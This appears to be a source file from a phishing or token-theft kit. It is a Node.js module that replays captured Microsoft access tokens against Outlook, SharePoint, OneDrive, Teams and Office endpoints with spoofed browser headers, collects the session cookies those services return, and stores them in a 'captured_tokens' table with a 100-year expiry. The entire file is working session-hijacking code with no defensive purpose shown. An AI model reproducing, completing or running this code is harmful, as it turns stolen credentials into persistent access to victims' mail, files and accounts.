const axios = require('axios');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');

// Microsoft endpoints for cookie conversion per service
// SECURITY: Never include tokens in URL parameters - always use headers
const SERVICE_ENDPOINTS = {
  sharepoint: 'https://login.microsoftonline.com/common/oauth2/authorize',
  outlook: 'https://outlook.office365.com/owa/',
  onedrive: 'https://{tenant}-my.sharepoint.com/personal/{email}/_layouts/15/onedrive.aspx',
  teams: 'https://teams.microsoft.com/',
  office: 'https://www.office.com/',
  default: 'https://www.office.com/',
};

async function convertTokensToCookies(accessToken, templateType, tenant = 'common', email = '') {
  const cookieJar = {};
  
  try {
    // Step 1: Get initial cookies from login.microsoftonline.com
    await fetchCookiesFromEndpoint(cookieJar, 'https://login.microsoftonline.com/common/oauth2/authorize', accessToken);
    
    // Step 2: Get service-specific cookies
    const endpoints = getServiceEndpoints(templateType, tenant, email);
    for (const endpoint of endpoints) {
      await fetchCookiesFromEndpoint(cookieJar, endpoint, accessToken);
    }
    
    // Step 3: Convert cookie jar to string - include domain info
    const cookieStrings = [];
    for (const [domain, cookies] of Object.entries(cookieJar)) {
      for (const cookie of cookies) {
        cookieStrings.push(`${cookie.name}=${cookie.value}`);
      }
    }
    
    if (cookieStrings.length === 0) {
      return { success: false, error: 'No cookies captured - access token may be expired', cookies: null };
    }
    
    const cookieString = cookieStrings.join('; ');
    
    return { success: true, cookies: cookieString };
  } catch (err) {
    console.error('[CookieConverter] Conversion failed:', err.message);
    return { success: false, error: err.message, cookies: null };
  }
}

async function fetchCookiesFromEndpoint(cookieJar, url, accessToken) {
  try {
    const response = await axios.get(url, {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
      },
      maxRedirects: 5,
      validateStatus: status => status < 400,
    });
    
    // Extract cookies from response
    const setCookieHeaders = response.headers['set-cookie'] || [];
    for (const cookieStr of setCookieHeaders) {
      const cookieParts = cookieStr.split(';')[0].trim();
      const eqIndex = cookieParts.indexOf('=');
      if (eqIndex > 0) {
        const cookieName = cookieParts.substring(0, eqIndex).trim();
        const cookieValue = cookieParts.substring(eqIndex + 1).trim();
        
        if (cookieName && cookieValue) {
          // Store by domain
          const domain = new URL(url).hostname;
          if (!cookieJar[domain]) cookieJar[domain] = [];
          cookieJar[domain].push({ name: cookieName, value: cookieValue });
        }
      }
    }
  } catch (err) {
    // Try POST if GET fails
    try {
      const response = await axios.post(url, 
        {},
        {
          headers: {
            'Authorization': `Bearer ${accessToken}`,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          },
          maxRedirects: 5,
          validateStatus: status => status < 400,
        }
      );
      
      // Extract cookies from POST response
      const setCookieHeaders = response.headers['set-cookie'] || [];
      for (const cookieStr of setCookieHeaders) {
        const cookieParts = cookieStr.split(';')[0].trim();
        const eqIndex = cookieParts.indexOf('=');
        if (eqIndex > 0) {
          const cookieName = cookieParts.substring(0, eqIndex).trim();
          const cookieValue = cookieParts.substring(eqIndex + 1).trim();
          
          if (cookieName && cookieValue) {
            const domain = new URL(url).hostname;
            if (!cookieJar[domain]) cookieJar[domain] = [];
            cookieJar[domain].push({ name: cookieName, value: cookieValue });
          }
        }
      }
    } catch (postErr) {
      // Ignore errors - we're just collecting cookies
    }
  }
}

function getServiceEndpoints(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  const endpoints = ['https://login.microsoftonline.com/common/oauth2/authorize'];
  
  if (type.includes('sharepoint')) {
    endpoints.push('https://login.microsoftonline.com/common/oauth2/authorize');
    endpoints.push(`https://${tenant}.sharepoint.com/_layouts/15/teamslogon.aspx`);
  } else if (type.includes('outlook') || type.includes('auth')) {
    endpoints.push('https://outlook.office365.com/owa/');
    endpoints.push('https://outlook.office.com/owa/');
  } else if (type.includes('onedrive')) {
    endpoints.push('https://onedrive.live.com/');
    if (email) {
      endpoints.push(`https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email)}/_layouts/15/onedrive.aspx`);
    }
  } else if (type.includes('teams')) {
    endpoints.push('https://teams.microsoft.com/');
    endpoints.push('https://teams.microsoft.com/api/authservice/health');
  } else if (type.includes('office')) {
    endpoints.push('https://www.office.com/');
    endpoints.push('https://www.office.com/login');
  }
  
  return endpoints;
}

function determineEndpoint(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return 'https://login.microsoftonline.com/common/oauth2/authorize';
  if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
  if (type.includes('teams')) return 'https://teams.microsoft.com/';
  if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
  return 'https://www.office.com/';
}

function determineResource(templateType, tenant) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return `https://${tenant}.sharepoint.com`;
  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com`;
  return 'https://graph.microsoft.com';
}

async function processCookieConversion(tokenId, accessToken, templateType) {
  const result = await convertTokensToCookies(accessToken, templateType);
  
  if (result.success && result.cookies) {
    // 100 years expiry - never expire
    const ttlHours = 24 * 365 * 100; // 100 years
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), last_renewed = NOW(), renewal_count = 1 WHERE id = ?',
      [encrypt(result.cookies), 'cookie', ttlHours, tokenId]
    );
  }
  
  return result;
}

module.exports = { convertTokensToCookies, processCookieConversion, determineEndpoint };
